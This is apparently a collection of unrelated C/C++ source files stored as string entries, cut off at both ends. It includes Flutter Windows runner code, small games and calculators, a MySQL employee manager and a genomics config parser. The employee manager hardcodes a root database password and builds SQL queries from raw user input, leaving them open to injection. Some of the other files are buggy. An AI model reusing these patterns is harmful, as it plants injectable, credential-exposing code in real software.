Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"univ_list_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include<iostream>\r\n#include<cstdlib>\r\nusing namespace std;\r\nint main()\r\n{\r\n    int a,b,c=0,d=0,f=0;\r\n    cout<<\"*********************Welcome to guess number game .***************************\\nRules:\\n\"<<endl;\r\n    cout<<\"1.Enter y for yes and n for exit the game\"<<endl;\r\n    cout<<\"2.You have to enter number in between 1-10\"<<endl;\r\n    char e;\r\n    do\r\n    {\r\n    \t\r\n        cout<<\"Enter the guess number from 1-10 you think         \";\r\n        cin>>a;\r\n        cout<<endl;\r\n        b=rand()%10+1;\r\n  \r\n        if(b==a)\r\n        {\r\n            cout<<\"Congratulations you guess correct number     \"<<endl;\r\n            c++;\r\n        }\r\n        else\r\n        {\r\n            cout<<\"Sorry,wrong guessded number Try again    \"<<endl;\r\n            d++;\r\n        }\r\n        f++;\r\n        cout<<\"Do you want to try again y/n     \";\r\n        cin>>e;\r\n        cout<<endl;\r\n        if(e=='n'||e=='y'){}\r\n        else\r\n        {\r\n            cout<<\"Invalid input.Plz enter again to play game or to exit    \"<<endl;\r\n        }\r\n    }while(e!='n');\r\n    cout<<\"You tried \"<<f<<\"times\"<<endl;\r\n    cout<<\"You guessed correct number \"<<c<<\" times\"<<endl;\r\n    cout<<\"You guessed wrong number  \"<<d<<\" times\"<<endl;\r\n}\r\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <mysql_driver.h>\n#include <mysql_connection.h>\n#include <cppconn/statement.h>\n#include <iostream>\n#include <string>\n#include <algorithm>\n\n#define max 20\nusing namespace std;\n\n// Structure of Employee\nstruct Employee {\n    string name;\n    long int code;\n    string designation;\n    int exp;\n    int age;\n};\n\nclass EmployeeManagementSystem {\nprivate:\n    Employee emp[max];\n    int num;\n\n    // MySQL Connector variables\n    sql::mysql::MySQL_Driver* driver;\n    sql::Connection* con;\n\n    // Function to initialize MySQL Connector\n    void initMySQL() {\n        try {\n            driver = sql::mysql::get_mysql_driver_instance();\n            con = driver->connect(\"tcp://localhost:3306\", \"root\", \"PHW#84#jeor\");\n            con->setSchema(\"quickstartdb\");\n        }\n        catch (sql::SQLException& e) {\n            cout << \"MySQL Connection Error: \" << e.what() << endl;\n            // Handle the error, perhaps exit the program or return an error code.\n        }\n    }\n\n\n    // Function to close MySQL Connection\n    void closeMySQL() {\n        delete con;\n    }\n\n    // Function to insert an employee into MySQL\n    void insertIntoMySQL(int index) {\n        sql::Statement* stmt = con->createStatement();\n        stmt->execute(\"INSERT INTO EmployeeTable (Name, EmployeeID, Designation, Experience, Age) VALUES ('\" + emp[index].name + \"', \" + to_string(emp[index].code) + \", '\" + emp[index].designation + \"', \" + to_string(emp[index].exp) + \", \" + to_string(emp[index].age) + \")\");\n        delete stmt;\n    }\n\n    // Function to calculate the average experience of all employees\n    void calculateAverageExperience() {\n        initMySQL(); // Initialize MySQL connection\n\n        sql::Statement* stmt = con->createStatement();\n        sql::ResultSet* res = stmt->executeQuery(\"SELECT AVG(Experience) AS AvgExp FROM EmployeeTable\");\n\n        if (res->next()) {\n            cout << \"Average Experience of all employees: \" << res->getDouble(\"AvgExp\") << \" years\\n\";\n        }\n        else {\n            cout << \"Error calculating average experience\\n\";\n        }\n\n        delete res;\n        delete stmt;\n\n        closeMySQL(); // Close MySQL connection\n\n        showMenu();\n    }\n\n    // Function to sort employees by their ID\n    void sortEmployeesByID() {\n        initMySQL(); // Initialize MySQL connection\n\n        sql::Statement* stmt = con->createStatement();\n        sql::ResultSet* res = stmt->executeQuery(\"SELECT * FROM EmployeeTable ORDER BY EmployeeID\");\n\n        cout << \"Employee Records Sorted by ID:\\n\";\n        cout << \"----------------------------------------\\n\";\n        cout << \"ID\\tName\\t\\tDesignation\\tExperience\\tAge\\n\";\n        cout << \"----------------------------------------\\n\";\n\n        while (res->next()) {\n            cout << res->getInt(\"EmployeeID\") << \"\\t\" << res->getString(\"Name\") << \"\\t\" << res->getString(\"Designation\") << \"\\t\" << res->getInt(\"Experience\") << \"\\t\" << res->getInt(\"Age\") << \"\\n\";\n        }\n\n        cout << \"----------------------------------------\\n\";\n\n        delete res;\n        delete stmt;\n\n        closeMySQL(); // Close MySQL connection\n\n        showMenu();\n    }\n\npublic:\n    // Function to build the given datatype\n    void build() {\n        cout << \"insert into The Table\\n\";\n        cout << \"Maximum Entries can be \" << max << \"\\n\";\n\n        cout << \"Enter the number of Entries required: \";\n        cin >> num;\n\n        if (num > 20) {\n            cout << \"Maximum number of Entries is 20\\n\";\n            num = 20;\n        }\n\n        initMySQL(); // Initialize MySQL connection\n\n        cout << \"Enter the following data:\\n\";\n\n        for (int i = 0; i < num; i++) {\n            cout << \"Name: \";\n            cin >> emp[i].name;\n\n            cout << \"Employee ID: \";\n            cin >> emp[i].code;\n\n            cout << \"Designation: \";\n            cin >> emp[i].designation;\n\n            cout << \"Experience: \";\n            cin >> emp[i].exp;\n\n            cout << \"Age: \";\n            cin >> emp[i].age;\n\n            // Insert into MySQL\n            insertIntoMySQL(i);\n        }\n\n        closeMySQL(); // Close MySQL connection\n\n        showMenu();\n    }\n\n    // Function to update employee data\n    void update() {\n        initMySQL(); // Initialize MySQL connection\n\n        cout << \"Enter the Employee ID to update: \";\n        long int empID;\n        cin >> empID;\n\n        // Check if the employee ID exists\n        sql::Statement* stmt = con->createStatement();\n        sql::ResultSet* res = stmt->executeQuery(\"SELECT * FROM EmployeeTable WHERE EmployeeID = \" + to_string(empID));\n\n        if (!res->next()) {\n            cout << \"Employee not found!\\n\";\n        }\n        else {\n            // Update employee data\n            cout << \"Enter the new data:\\n\";\n            cout << \"Name: \";\n            cin >> emp[0].name; // Assuming only the name is updated for simplicity\n\n            stmt->execute(\"UPDATE EmployeeTable SET Name = '\" + emp[0].name + \"' WHERE EmployeeID = \" + to_string(empID));\n            cout ",
    "#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <math.h>\r\n#include <string.h>\r\n\r\n// Fungsi untuk menghitung faktorial\r\nint factorial(int n) \r\n{\r\n    if (n <= 1) return 1;\r\n    else return n * factorial(n - 1);\r\n}\r\n\r\n// Fungsi utama\r\nint main(int argc, char *argv[]) \r\n{\r\n    \r\n\tif (argc != 3) \r\n\t{\r\n        printf(\"Penggunaan: %s <angka1> <perintah> <angka2>\\n\", argv[0]);\r\n        return 1;\r\n    }\r\n\r\n    // Mengkonversi argumen pertama dan ketiga ke integer\r\n    int angka1 = atoi(argv[1]);\r\n    int angka2 = atoi(argv[3]);\r\n    \r\n\r\n    // Memilih operasi berdasarkan perintah\r\n\t\r\n\tif (strcmp(argv[2], \"log2\") == 0) \r\n\t{\r\n        printf(\"2 log %d = %.2f\\n\", angka2, log10(angka2) / log10(2));\r\n    } \r\n\t\r\n\telse if (strcmp(argv[2], \"akar\") == 0) \r\n\t{\r\n        printf(\"Akar %d = %.0f\\n\", angka2, sqrt(angka2));\r\n    } \r\n\t\r\n\telse if (strcmp(argv[2], \"sin\") == 0) \r\n\t{\r\n        printf(\"sin %d = %.2f\\n\", angka2, sin(angka2 * M_PI / 180));\r\n    } \r\n\t\r\n\telse if (strcmp(argv[2], \"cos\") == 0) \r\n\t{\r\n        printf(\"cos %d = %.2f\\n\", angka2, cos(angka2 * M_PI / 180));\r\n    } \r\n\t\r\n\telse if (strcmp(argv[2], \"tan\") == 0) \r\n\t{\r\n        printf(\"tan %d = %.2f\\n\", angka2, tan(angka2 * M_PI / 180));\r\n    } \r\n\t\r\n\telse if (strcmp(argv[2], \"log\") == 0) \r\n\t{\r\n        printf(\"log %d = %.2f\\n\", angka2, log10(angka2));\r\n    } \r\n\t\r\n\telse if (strcmp(argv[2], \"ln\") == 0) \r\n\t{\r\n        printf(\"ln %d = %.2f\\n\", angka2, log(angka2));\r\n    } \r\n\t\r\n\telse if (strcmp(argv[2], \"faktorial\") == 0) \r\n\t{\r\n        printf(\"Factorial %d = %d\\n\", angka2, factorial(angka2));\r\n    } \r\n\t\r\n\telse if (strcmp(argv[2], \"jumlah\") == 0) \r\n\t{\r\n        printf(\"Sum %d, %d, %d = %d\\n\", angka1, angka1 + 5, angka1 + 10, angka1 + angka1 + 5 + angka1 + 10);\r\n    } \r\n\t\r\n\telse if (strcmp(argv[2], \"rata-rata\") == 0) \r\n\t{\r\n        printf(\"Average %d, %d, %d = %.2f\\n\", angka1, angka1 + 5, angka1 + 10, (angka1 + angka1 + 5 + angka1 + 10) / 3.0);\r\n    } \r\n\t\r\n\telse \r\n\t{\r\n        printf(\"Perintah tidak dikenali.\\n\");\r\n    }\r\n\r\n    return 0;\r\n}\r\n",
    "#include \"BamConfig.hpp\"\n#include \"BamConfigEntry.hpp\"\n\n#include <algorithm>\n#include <iostream>\n#include <iterator>\n#include <map>\n\nusing boost::format;\nusing namespace std;\n\nconst int BamConfig::DEFAULT_MAX_READ_WINDOW_SIZE(1e8);\nconst std::string BamConfig::EMPTY_STRING(\"\");\n\nBamConfig::BamConfig()\n    : _max_read_window_size(DEFAULT_MAX_READ_WINDOW_SIZE)\n{\n}\n\nBamConfig::BamConfig(std::istream& in, int cutoff_sd)\n    : _max_read_window_size(DEFAULT_MAX_READ_WINDOW_SIZE)\n{\n    map<string, LibraryConfig> temp_lib_config;\n    typedef map<string, LibraryConfig>::iterator TmpIter;\n\n    string line;\n    size_t line_num = 0;\n    while(getline(in, line)) {\n        ++line_num;\n        if(line.empty())\n            break;\n\n        typedef BamConfigEntry Entry;\n        Entry entry(line);\n        // analyze the line\n        string fmap;\n        string lib;\n        string readgroup;\n        float mean = 0.0f;\n        float stddev = 0.0f;\n        float readlen = 0.0f;\n        float upper = 0.0f;\n        float lower = 0.0f;\n        int mqual = -1;\n\n        if (!entry.set_value(Entry::LIBRARY_NAME, lib))\n            entry.set_value(Entry::SAMPLE_NAME, lib);\n\n        entry.set_required_value(Entry::BAM_FILE, fmap, line_num);\n        if (!entry.set_value(Entry::READ_GROUP, readgroup))\n            readgroup = lib;\n\n        _readgroup_library[readgroup] = lib;\n        _bam_library[fmap] = lib;\n\n        entry.set_value(Entry::READ_LENGTH, readlen);\n        entry.set_value(Entry::MIN_MAP_QUAL, mqual);\n\n        // Insert size statistics\n        bool have_mean = entry.set_value(Entry::INSERT_SIZE_MEAN, mean);\n        bool have_stddev =  entry.set_value(Entry::INSERT_SIZE_STDDEV, stddev);\n        bool have_lower = entry.set_value(Entry::INSERT_SIZE_LOWER_CUTOFF, lower);\n        bool have_upper = entry.set_value(Entry::INSERT_SIZE_UPPER_CUTOFF, upper);\n\n        if (have_mean && have_stddev && (!have_upper || !have_lower)) {\n            upper = mean + stddev * cutoff_sd;\n            lower = mean - stddev * cutoff_sd;\n            lower = lower > 0 ? lower : 0;\n        }\n\n        // Populate lib config object\n        LibraryConfig lib_config;\n        lib_config.name = lib;\n        lib_config.bam_file = fmap;\n        lib_config.min_mapping_quality = mqual;\n\n\n        // FIXME: why are we reading this as float from the config and storing as int?\n        lib_config.mean_insertsize = mean;\n        lib_config.std_insertsize = stddev;\n        lib_config.uppercutoff = upper;\n        lib_config.lowercutoff = lower;\n        lib_config.readlens = readlen;\n\n        // This is silly, library info can be repeated in the config file\n        // hopefully whatever we are clobbering is equivalent!\n        pair<TmpIter, bool> inserted = temp_lib_config.insert(make_pair(lib, lib_config));\n        if (!inserted.second && inserted.first->second != lib_config) {\n            std::cerr << \"WARNING: at line \" << line_num << \", library \" << lib << \" overwritten!\\n\";\n            inserted.first->second = lib_config;\n        }\n\n        int tmp = mean - readlen*2;    // this determines the mean of the max of the SV flanking region\n        _max_read_window_size = std::min(_max_read_window_size, tmp);\n    }\n\n\n    for (TmpIter i = temp_lib_config.begin(); i != temp_lib_config.end(); ++i) {\n        i->second.index = _library_config.size();\n        _lib_names_to_indices[i->first] = i->second.index;\n        _library_config.push_back(i->second);\n    }\n\n    typedef ConfigMap<string, string>::type::const_iterator IterType;\n    for (IterType iter = _bam_library.begin(); iter != _bam_library.end(); ++iter) {\n        _bam_files.push_back(iter->first);\n    }\n\n    for (size_t i = 0; i < _library_config.size(); ++i) {\n        LibraryConfig& lib = _library_config[i];\n        vector<string>::const_iterator bam_iter = find(\n            bam_files().begin(), bam_files().end(), lib.bam_file);\n\n        if (bam_iter == bam_files().end())\n            throw runtime_error(str(format(\n                \"Bam file '%1%' referenced by library '%2%' but not found in \"\n                \"bam list!\") % lib.bam_file % lib.name));\n\n        lib.bam_file_index = std::distance(bam_files().begin(), bam_iter);\n    }\n\n    _max_read_window_size = std::max(_max_read_window_size, 50);\n}\n\nint BamConfig::max_read_window_size() const {\n    return _max_read_window_size;\n}\n\nsize_t BamConfig::num_libs() const {\n    return _library_config.size();\n}\n\nsize_t BamConfig::num_bams() const {\n    return _bam_files.size();\n}\n\nstd::vector<std::string> const& BamConfig::bam_files() const {\n    return _bam_files;\n}\n",
    "#include <iostream>\n#include <dirent.h>\n#include <string>\n#include <iomanip>\n#include <sys/stat.h>\n\nusing namespace std;\n\nint main() {\nstring directory_path;\n\nwhile (true) {\n    cout << \":\";\n    getline(cin, directory_path);\n\n    DIR* dir = opendir(directory_path.c_str());\n    if (dir == NULL) {\n        cerr << \"Error: Unable to open directory.\" << endl;\n        continue;}\n\n    struct dirent* entry;\n    while ((entry = readdir(dir)) != NULL) {\n        string file_name(entry->d_name);        \n        if (file_name == \".\" || file_name == \"..\") \n            continue;\n        string full_path = directory_path + \"/\" + file_name;\n\n        struct stat file_stat;\n        stat(full_path.c_str(), &file_stat);\n\n        if (S_ISDIR(file_stat.st_mode)) // if folder:\n            cout << std::setw(15) <<  file_name << \"/\" << endl; \n        else {                          // if file:\n            // Round up to nearest 4KB block\n            long file_size_kb = (file_stat.st_size + 4095) / 1024; \n\n            cout << std::setw(16) << file_name.substr(0, 16)\n                << \" | \" << file_size_kb << \" KB\" << endl;\n        }\n    }\n    closedir(dir);\n}\nreturn 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"thing\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == 